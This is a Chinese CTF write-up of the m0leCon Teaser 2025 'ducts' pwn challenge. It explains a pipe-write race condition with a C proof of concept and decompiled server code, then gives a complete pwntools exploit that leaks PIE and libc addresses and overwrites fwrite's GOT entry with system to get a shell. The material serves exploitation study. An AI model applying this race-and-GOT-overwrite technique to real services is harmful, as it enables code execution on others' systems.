+<h1 id="检查">检查</h1>
+<p>GOT 表可写</p>
+<h1 id="调试">调试</h1>
+<ul>
+<li><p>set detach-on-fork off
+这条 gdb 指令会使调试父进程或子进程时，另一进程自动暂停在 fork 位置。这里用于方便观察</p>
+</li>
+<li><p>set follow-fork-mode parent   调试父进程</p>
+</li>
+<li><p>set follow-fork-mode child   调试子进程</p>
+</li>
+</ul>
+<h1 id="poc">poc</h1>
+<pre><code class="language-c">
+
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;fcntl.h&gt;
+
+#define TEST_SIZE 68*1024 
+#define NUM_CHILDREN 2
+
+int main() {
+    int i;
+    pid_t pid;
+    int *start_flag;
+    char a[TEST_SIZE];
+   
+    
+    int pipefd[2];
+    int ret;
+
+    pipe(pipefd);
+    // 使用共享内存来同步
+    start_flag = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+    if (start_flag == MAP_FAILED) {
+        perror(&quot;mmap&quot;);
+        exit(EXIT_FAILURE);
+    }
+    
+    pid = fork();
+   if (pid == 0)
+    {   printf(&quot;read pipe apid=%d  begin\n&quot;, getpid());
+        close(pipefd[1]);
+        char buf[1024 * 4] = {0};
+        int n = 1;
+        while (1)
+        {
+            ret = read(pipefd[0], buf, sizeof(buf)); //当管道被写入数据，就已经可以开始读了,每次读取4k
+            if (ret == 0) // 管道写端全部关闭,即读到了结尾
+                break;
+            printf(&quot;n=%02d pid=%d read %d bytes from pipe buf[4095]=%c\n&quot;,
+                n++, getpid(), ret, buf[4095]);
+        }
+    }
+
+    *start_flag = 0;  // 初始化同步标志为0
+
+    for (i = 0; i &lt; NUM_CHILDREN; i++) {
+        pid = fork();
+        if (pid == 0) {
+            printf(&quot;write pipe apid=%d  begin\n&quot;, getpid());
+            while (*start_flag == 0) {
+                // 等待父进程设置start_flag为1
+                usleep(100);
+            }
+
+            close(pipefd[0]);
+            memset(a, &#39;A&#39;+i, sizeof(a));
+            ret = write(pipefd[1], a, sizeof(a)); // 全部写完才返回
+            printf(&quot;apid=%d write %d bytes to pipe\n&quot;, getpid(), ret);
+            exit(0);
+        }
+    }
+    sleep(1);
+    *start_flag = 1;
+    for (i = 0; i &lt; NUM_CHILDREN+1; i++) {
+        wait(NULL);  // 等待所有子进程结束
+    }
+    // 释放共享内存
+    if (munmap(start_flag, sizeof(int)) == -1) {
+        perror(&quot;munmap&quot;);
+        exit(EXIT_FAILURE);
+    }
+    return 0;
+}
+</code></pre>
+<p>可以看到，pipe_write 阻塞后，pipe_read 唤醒的是另一个进程 B
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2025/%E7%AE%A1%E9%81%93%E7%AB%9E%E4%BA%89%20-%20m0leCon%20CTF%20Teaser%202025%20-%20ducts/assets/csdn-142316842/image-001-d129fc7a95.png" alt="图片"></p>
+<h1 id="逆向分析">逆向分析</h1>
+<pre><code class="language-c">int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int *v3; // rax
+  uint16_t port; // ax
+  socklen_t addr_len; // [rsp+8h] [rbp-48h] BYREF
+  socklen_t len; // [rsp+Ch] [rbp-44h] BYREF
+  int server_fd; // [rsp+10h] [rbp-40h]
+  int client_fd; // [rsp+14h] [rbp-3Ch]
+  int pipedes[2]; // [rsp+18h] [rbp-38h] BYREF
+  struct sockaddr sockaddr; // [rsp+20h] [rbp-30h] BYREF
+  struct sockaddr client_addr; // [rsp+30h] [rbp-20h] BYREF
+  unsigned __int64 v13; // [rsp+48h] [rbp-8h]
+
+  v13 = __readfsqword(0x28u);
+  alarm(0x3Cu);
+  pipe(pipedes);
+  if ( !fork() )
+    backend(pipedes[0]);
+  server_fd = socket(2, 1, 0);
+  if ( server_fd == -1 )
+  {
+    puts(&quot;socket creation failed...&quot;);
+    exit(1);
+  }
+  puts(&quot;Socket successfully created..&quot;);
+  memset(&amp;sockaddr, 0, sizeof(sockaddr));
+  sockaddr.sa_family = 2;
+  *(_DWORD *)&amp;sockaddr.sa_data[2] = htonl(0);
+  *(_WORD *)sockaddr.sa_data = htons(0);
+  if ( bind(server_fd, &amp;sockaddr, 0x10u) )
+  {
+    puts(&quot;socket bind failed...&quot;);
+    exit(1);
+  }
+  puts(&quot;Socket successfully binded..&quot;);
+  if ( listen(server_fd, 5) )
+  {
+    puts(&quot;Listen failed...&quot;);
+    exit(1);
+  }
+  puts(&quot;Server listening..&quot;);
+  len = 16;
+  if ( getsockname(server_fd, &amp;sockaddr, &amp;len) )
+  {
+    v3 = __h_errno_location();
+    printf(&quot;failed to get hostname with errno %d\n&quot;, (unsigned int)*v3);
+    exit(1);
+  }
+  port = htons(*(uint16_t *)sockaddr.sa_data);
+  printf(&quot;Port is %u\n&quot;, port);
+  addr_len = 16;
+  while ( 1 )
+  {
+    client_fd = accept(server_fd, &amp;client_addr, &amp;addr_len);
+    if ( !client_fd )
+      break;
+    if ( !fork() )
+      talk(client_fd, pipedes[1]);
+  }
+  close(server_fd);
+  return 0;
+}
+</code></pre>
+<pre><code class="language-c">void __fastcall __noreturn backend(unsigned int pipe_read)
+{
+  int read_from_pipe_read; // [rsp+1Ch] [rbp-4h]
+
+  first = (__int64)NULL_MESSAGE;
+  last = (__int64)NULL_MESSAGE;
+  devnull = fopen(&quot;/dev/null&quot;, &quot;w&quot;);
+  while ( 1 )
+  {
+    read_from_pipe_read = identify_incoming(pipe_read);
+    if ( read_from_pipe_read == 1 )
+    {
+      handle_command(pipe_read);
+    }
+    else if ( !read_from_pipe_read )
+    {
+      handle_message(pipe_read);
+    }
+  }
+}
+__int64 __fastcall identify_incoming(int pipe_read)
+{
+  unsigned int buf; // [rsp+14h] [rbp-Ch] BYREF
+  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  read(pipe_read, &amp;buf, 4uLL);
+  return buf;
+}
+void __fastcall handle_command(int pipe_read)
+{
+  signed int destory_buf_len; // eax
+  struct command *command; // [rsp+18h] [rbp-8h]
+
+  command = receive_command(pipe_read);
+  destory_buf_len = command-&gt;destory_buf_len;
+  if ( destory_buf_len == 0xDEADC0DE )
+  {
+    flush_messages();
+    goto LABEL_9;
+  }
+  if ( destory_buf_len &gt; (int)0xDEADC0DE )
+    goto LABEL_8;
+  if ( destory_buf_len == 0xCAFEBABE )
+  {
+    redact_message((__int64)command);
+    goto LABEL_9;
+  }
+  if ( destory_buf_len != 0xDEADBEEF )
+  {
+LABEL_8:
+    printf(&quot;Invalid command %d&quot;, (unsigned int)command-&gt;destory_buf_len);
+    goto LABEL_9;
+  }
+  print_messages();
+LABEL_9:
+  destroy_packet(command);
+}
+struct message *__fastcall handle_message(int pipe_read)
+{
+  struct message *result; // rax
+  struct message *message; // [rsp+18h] [rbp-8h]
+
+  message = receive_message(pipe_read);
+  printf(&quot;Destroying message with len &#39;%d&#39; by %s\n&quot;, (unsigned int)message-&gt;destroy_buf_len, message-&gt;name);
+  fwrite(message-&gt;destory_buf, 1uLL, (int)message-&gt;destroy_buf_len, devnull);
+  if ( (void *)first == NULL_MESSAGE )
+    first = (__int64)message;
+  else
+    *(_QWORD *)(last + 8) = message;
+  result = message;
+  last = (__int64)message;
+  return result;
+}
+</code></pre>
+<pre><code class="language-c">void *flush_messages()
+{
+  void *result; // rax
+
+  first = (__int64)NULL_MESSAGE;
+  result = NULL_MESSAGE;
+  last = (__int64)NULL_MESSAGE;
+  return result;
+}
+void *__fastcall redact_message(struct command *command)
+{
+  void *result; // rax
+  int index; // [rsp+14h] [rbp-14h]
+  struct message *v3; // [rsp+18h] [rbp-10h]
+  struct message *i; // [rsp+20h] [rbp-8h]
+
+  index = 0;
+  v3 = (struct message *)NULL_MESSAGE;
+  for ( i = (struct message *)first; i != NULL_MESSAGE &amp;&amp; v3 == NULL_MESSAGE; i = (struct message *)i-&gt;next )
+  {
+    if ( index == command-&gt;index )
+      v3 = i;
+    ++index;
+  }
+  result = NULL_MESSAGE;
+  if ( v3 != NULL_MESSAGE )
+  {
+    v3-&gt;destroy_buf_len = 1;
+    result = *(void **)command-&gt;buff;
+    *(_QWORD *)v3-&gt;destory_buf = result;
+  }
+  return result;
+}
+void *print_messages()
+{
+  void *result; // rax
+  struct message *i; // [rsp+8h] [rbp-8h]
+
+  for ( i = (struct message *)first; ; i = (struct message *)i-&gt;next )
+  {
+    result = NULL_MESSAGE;
+    if ( i == NULL_MESSAGE || !i )
+      break;
+    printf(&quot;Message %p is &#39;%s&#39; by %s. Next is %p\n&quot;, i, i-&gt;destory_buf, i-&gt;name, (const void *)i-&gt;next);
+  }
+  return result;
+}
+struct message *__fastcall receive_message(int pipe_read)
+{
+  int destroy_buf_len; // [rsp+10h] [rbp-30h] BYREF
+  int index; // [rsp+14h] [rbp-2Ch]
+  void *p_next; // [rsp+18h] [rbp-28h]
+  struct message *message; // [rsp+20h] [rbp-20h]
+  __int64 remain_len; // [rsp+28h] [rbp-18h]
+  ssize_t read_bytes; // [rsp+30h] [rbp-10h]
+  unsigned __int64 v8; // [rsp+38h] [rbp-8h]
+
+  v8 = __readfsqword(0x28u);
+  read(pipe_read, &amp;destroy_buf_len, 4uLL);
+  message = create_message(destroy_buf_len);
+  remain_len = destroy_buf_len + 0x48LL;
+  p_next = &amp;message-&gt;next;
+  index = 0;
+  while ( remain_len &gt; index )
+  {
+    read_bytes = read(pipe_read, p_next, remain_len - index);
+    if ( read_bytes == -1 || !read_bytes )
+    {
+      printf(&quot;Protocol error!&quot;);
+      exit(1);
+    }
+    index += read_bytes;
+    p_next = (char *)p_next + read_bytes;
+  }
+  return message;
+}
+</code></pre>
+<pre><code class="language-c">struct message *__fastcall create_message(int destroy_buf_len)
+{
+  struct message *message; // rax
+
+  message = (struct message *)malloc(destroy_buf_len + 0x50LL);
+  message-&gt;mes_or_com = 0;
+  message-&gt;next = NULL_MESSAGE;
+  message-&gt;destroy_buf_len = destroy_buf_len;
+  return message;
+}
+struct message *__fastcall create_fill_message(const void *name, const void *destroy_buf, int destroy_buf_len)
+{
+  struct message *message; // [rsp+28h] [rbp-8h]
+
+  message = create_message(destroy_buf_len);
+  memcpy(message-&gt;name, name, sizeof(message-&gt;name));
+  memcpy(message-&gt;destory_buf, destroy_buf, destroy_buf_len);
+  return message;
+}
+ssize_t __fastcall send_message(struct message *message, int pipe_write)
+{
+  return write(pipe_write, message, message-&gt;destroy_buf_len + 0x50);
+}
+// bad sp value at call has been detected, the output may be wrong!
+void __fastcall __noreturn talk(int client_fd, int pipe_write)
+{
+  int v2; // eax
+  int index; // [rsp+10h] [rbp-27168h]
+  int j; // [rsp+14h] [rbp-27164h]
+  int i; // [rsp+18h] [rbp-27160h]
+  int read_bytes; // [rsp+1Ch] [rbp-2715Ch]
+  struct message *fill_message; // [rsp+20h] [rbp-27158h]
+  char name[64]; // [rsp+28h] [rbp-27150h] BYREF
+  char destroy_buf[272]; // [rsp+68h] [rbp-27110h] BYREF
+  char v10; // [rsp+178h] [rbp-27000h] BYREF
+  __int64 v11[512]; // [rsp+26178h] [rbp-1000h] BYREF
+
+  while ( v11 != (__int64 *)&amp;v10 )
+    ;
+  v11[511] = __readfsqword(0x28u);
+  index = 0;
+  dprintf(client_fd, &quot;Welcome to the network blackhole! What do you want to destroy?\n&quot;);
+  do
+  {
+    read_bytes = read(client_fd, &amp;destroy_buf[index], 0x27100 - index);
+    for ( i = 0; i &lt; read_bytes &amp;&amp; destroy_buf[index + i] != &#39;\n&#39;; ++i )
+      ;
+    index += i;
+  }
+  while ( i &gt;= read_bytes );
+  destroy_buf[index] = 0;
+  dprintf(client_fd, &quot;Please leave also your name for recording purposes!\n&quot;);
+  read(client_fd, name, 0x40uLL);
+  for ( j = 0; j &lt;= 63 &amp;&amp; name[j] != &#39;\n&#39;; ++j )
+    ;
+  name[j] = 0;
+  fill_message = create_fill_message(name, destroy_buf, index);
+  v2 = rand();
+  usleep(1000 * (v2 % 10 + 1));
+  send_message(fill_message, pipe_write);
+  dprintf(client_fd, &quot;Data sent to the blackhole, bye!\n&quot;);
+  destroy_packet(fill_message);
+  close(client_fd);
+  exit(0);
+}
+</code></pre>
+<h1 id="思路">思路</h1>
+<ul>
+<li>多个进程同时向管道写入超过管道缓冲区大小的内容，使一次管道接收流程在尚未收完时被打断</li>
+<li>随后唤醒另一个进程向管道写入，使剩余接收的数据来自另一个进程的管道写入；下一轮接收的便是我们自行构造的内容。不过，原始数据残留的那部分可能干扰后续接收中的管道流程，但问题不大，不会导致程序崩溃，只需成功一次即可
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2025/%E7%AE%A1%E9%81%93%E7%AB%9E%E4%BA%89%20-%20m0leCon%20CTF%20Teaser%202025%20-%20ducts/assets/csdn-142316842/image-002-686bcee4f7.png" alt="图片"></li>
+</ul>
+<p>另一个是 st4k 师傅的思路和示意图，如图所示
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2025/%E7%AE%A1%E9%81%93%E7%AB%9E%E4%BA%89%20-%20m0leCon%20CTF%20Teaser%202025%20-%20ducts/assets/csdn-142316842/image-003-902e905b9c.png" alt="图片"></p>
+<p>实现同时写管道：通过信号量。先将数据发送过去，再通过信号量机制同时开始写入</p>
+<p>泄露 PIE：利用残留的 next 字段为 NULL_MESSAGE 变量，其中保存了 PIE 地址，可以通过 printf_message 泄露</p>
+<p>泄露 libc：已有 PIE 后，仍可利用上述管道竞争，让接收到的 message 是由 destory_buffer 构造的。这样就能控制 message 的全部字段；将 next 控制到 GOT 表附近，使 next 的 next 部分落到 GOT 表中，便可泄露 libc。写入时需要指定索引，可以先构造 command_flush 命令结构体以清空索引，再发送 message，最后 command_redact。注意：要确保 next 对应的 next 的 next 为空</p>
+<p>劫持程序流程：直接将 system 写入 GOT 表；构造 next，使其对应 next 的 destory_buf 部分为 GOT 表，再通过 redact_message 将其改为 system 函数——修改这里 <code>fwrite(message-&gt;destory_buf, 1uLL, (int)message-&gt;destroy_buf_len, devnull);</code> 中的 fwrite，然后将 message-&gt;destory_buf 设为 /bin/sh，最后由 handle_message 触发 fwrite</p>
+<h1 id="利用脚本">利用脚本</h1>
+<pre><code class="language-python">from pwn import *
+import threading
+# Raw intereraction with challenge frontend
+PIPE_BUF=65536
+def send_message(message, author, sync: threading.Semaphore):
+    try:
+        r = remote(&quot;127.0.0.1&quot;, SERVICE_PORT)
+        r.sendline(message)
+        r.send(author)
+        sync.acquire()
+        r.send(b&quot;\n&quot;)
+        r.close()
+    except:
+        pass
+
+# Helper function to inject a payload using the race condition
+def send_stage(payload: dict):
+    sync = threading.Semaphore()
+
+    payload_raw = flat(payload)
+
+    #payload = b&quot;&quot;
+    payload_raw += cyclic(PIPE_BUF-len(payload_raw))
+    print(&quot;Starting threads...&quot;)
+    for i in range(30):
+        x = threading.Thread(target=send_message, args=(payload_raw,str(i).encode()*63, sync))
+        x.start()
+
+    print(&quot;Waiting for data to be sent&quot;)
+    time.sleep(5)
+    print(&quot;Triggering race condition!&quot;)
+    sync.release(30)
+
+### Helper functions to create C structs defined in challenge code
+def build_message(message, author, next):
+    return flat({
+        0: 0,
+        4: len(message),
+        8: p64(next),
+        16: author,
+        16+64: message
+    }, word_size=32)
+
+
+def build_command(instruction, parm1 = 0, parm2 = 0):
+    return flat({
+        0: 1,
+        4: instruction,
+        8: p64(parm1),
+        16: p64(parm2)
+    }, word_size=32)
+
+### Shortcuts for commands
+def command_flush():
+    return build_command(0xDEADC0DE)
+
+def command_print():
+    return build_command(0xdeadbeef)
+
+def command_redact(id, data):
+    return build_command(0xcafebabe, id, data)
+
+def leak_text(r: pwnlib.tubes.tube.tube):
+    payload = {
+        0: command_print(),
+    }
+    send_stage(payload)
+    while True:
+        null_element_address = int(r.recvline_contains(b&quot;Next is &quot;).strip().split(b&quot;Next is &quot;)[1], 0)
+        print(f&quot;Leaked {hex(null_element_address)}&quot;)
+
+        test_address = null_element_address-exe.symbols[&quot;NUL&quot;]
+
+        # This is an hacky way to identify the correct address from the various leaks.
+        if test_address % 4096 == 0:
+            exe.address = test_address
+            break
+
+    print(f&quot;Text base address = {hex(exe.address)}&quot;)
+    sleep(1)
+
+# Payload to perform arbitrary write
+def write_payload(addr, data):
+    return command_flush() + build_message(b&quot;CUT-HERE-FOR-WRITE&quot;, b&quot;CUT-HERE-FOR-WRITE\0&quot;, addr-0x80+6*8) + command_redact(1, data)
+def read_payload():
+    return command_print()
+
+
+def leak_libc(r: pwnlib.tubes.tube.tube):
+    # Before printing, we are gonna write 0x0 right before the address to be leaked
+    # So that mex-&gt;next is NULL
+    payload = {
+        0: write_payload(exe.got.fwrite-0x8, 0x0) + read_payload(),
+    }
+    send_stage(payload)
+
+    # Discard useless prints
+    r.recvline_contains(b&quot;&#39;CUT-HERE-FOR-LIBC-LEAK&#39; by CUT-HERE-FOR-LIBC-LEAK. Next is &quot;)
+
+    # Read leaked address
+    leaked_address = u64(r.recvline().strip().split(b&quot;&#39;&#39; by &quot;)[1].split(b&quot;.&quot;)[0]+b&#39;\x00\x00&#39;)
+    print(f&quot;libc.sym.fwrite = {hex(leaked_address)}&quot;)
+    libc.address = leaked_address - libc.sym.fwrite
+    print(f&quot;Libc base address = {hex(libc.address)}&quot;)
+    sleep(1)
+
+def rewrite_got(r: pwnlib.tubes.tube.tube):
+    payload = {
+        0: write_payload(exe.got.fwrite, libc.sym.system) + build_message(b&quot;/bin/sh&quot;, b&quot;Master pwner&quot;, 0x0),
+    }
+
+    send_stage(payload)
+
+exe=ELF(&quot;./chal&quot;)
+libc=ELF(&quot;./libc.so.6&quot;)
+
+p=process(&quot;./chal&quot;)
+p.recvuntil(b&quot;Port is &quot;)
+SERVICE_PORT=int(p.recvuntil(b&quot;\n&quot;,drop=True))
+print(&quot;remote port &quot;+str(SERVICE_PORT))
+leak_text(p)
+leak_libc(p)
+rewrite_got(p)
+p.close()
+</code></pre>
+
+    </article>
+    
+    <nav class="pn"><a href="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2025/2025%20Srdnlen%20CTF%20-%20A%20child&#39;s%20dream%EF%BC%88%E4%B8%80%E9%81%93%E4%BB%BB%E5%A4%A9%E5%A0%82%E6%B8%B8%E6%88%8F%20pwn%EF%BC%89/"><span class="l">上一篇</span>2025 Srdnlen CTF -- A child&#39;s dream（一道任天堂游戏 pwn）</a><span></span></nav>
+  </main>
+  <aside class="toc"><div class="toc-h">目录</div><a class="d3" href="#概述">概述</a><a class="d3" href="#创建管道">创建管道</a><a class="d3" href="#io-操作">I/O 操作</a><a class="d3" href="#配置选项">配置选项</a><a class="d3" href="#相关函数与系统调用">相关函数与系统调用</a><a class="d3" href="#通信语义">通信语义</a><a class="d3" href="#示例代码">示例代码</a><a class="d3" href="#参考资料-1">参考资料</a><a class="d2" href="#互斥锁">互斥锁</a><a class="d3" href="#1-mutex_init">1. mutex_init</a><a class="d3" href="#2-mutex_lock">2. mutex_lock</a><a class="d3" href="#3-mutex_unlock">3. mutex_unlock</a><a class="d3" href="#总结">总结</a><a class="d2" href="#pipe_read">pipe_read</a><a class="d3" href="#1-初始状态检查">1. 初始状态检查</a><a class="d3" href="#2-检查是否存在写入者">2. 检查是否存在写入者</a><a class="d3" href="#3-处理非阻塞模式">3. 处理非阻塞模式</a><a class="d3" href="#4-解锁并等待数据">4. 解锁并等待数据</a><a class="d3" href="#5-重新获取互斥锁并再次检查">5. 重新获取互斥锁并再次检查</a><a class="d2" href="#同时启动多个-pipe_write">同时启动多个 pipe_write</a><a class="d2" href="#pipe_read-读取后唤醒-pipe_write">pipe_read 读取后唤醒 pipe_write</a><a class="d3" href="#加入等待队列">加入等待队列</a><a class="d3" href="#唤醒机制">唤醒机制</a><a class="d3" href="#独占等待的唤醒策略">独占等待的唤醒策略</a><a class="d3" href="#具体唤醒哪个任务">具体唤醒哪个任务</a></aside>
+</div>
+<script type="module" src="/blog/article.js"></script>
+</body>
+</html>
